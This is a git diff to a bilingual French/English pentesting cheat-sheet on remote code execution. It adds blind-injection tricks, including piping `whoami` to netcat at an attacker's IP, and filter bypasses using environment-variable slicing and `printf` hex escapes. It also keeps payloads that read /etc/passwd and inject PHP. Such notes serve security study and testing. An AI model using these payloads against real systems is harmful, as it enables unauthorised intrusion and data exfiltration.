@@ -1,4 +1,4 @@
-# Remote Code Execution
+# RCE
 
 ## Principe
 
@@ -27,11 +27,18 @@
 ## General tips & trick
 
 * A basic OS command for test is `uname` \(but i suppose it would work only on a linux system\)
+* Si le résultat n'est pas reflété, utiliser à la place `sleep 10` pour voir si la commande a bien été injectée
+  * To send back result when it's not reflected, simply pipe it to nc : `whoami | nc <ip> <port>` \(given that the remote server has nc of course\)
 * When your payload is included inside a string, **use concatenation** : `" . system('cat /etc/passwd') ."`
 * Don't forget to **urlencode**
 * If some characters seems to be sanitized when the request first arrive, try to base64 encode them. Since the code you inject is executed, you can make the server decode it the moments it uses it.
+* Bypass sanitation :
+  * If the `/` is sanitize, you can usually get it by echoing the home directory `echo $HOME`
+  * Si un autre caractère est sanitize et qu'il existe dans une variable d'env, on peut faire ça :
+    * `echo ${ENV:13:1}` Le 1er nombre étant la position du char et le second le nombre à récupérer. Remplacer ENV par le nom de var d'env bien sûr
+  * On peut aussi utiliser `printf "\x41"` en remplacer 41 par le nombre hexa correspondant
 
-## PPH specific tips and tricks
+## PHP specific tips and tricks
 
 * If you've got input reflected into the html page, try to inject `<?php phpinfo(); ?>`
 * Try to get warnings instead of errors as they won't stop the execution flow
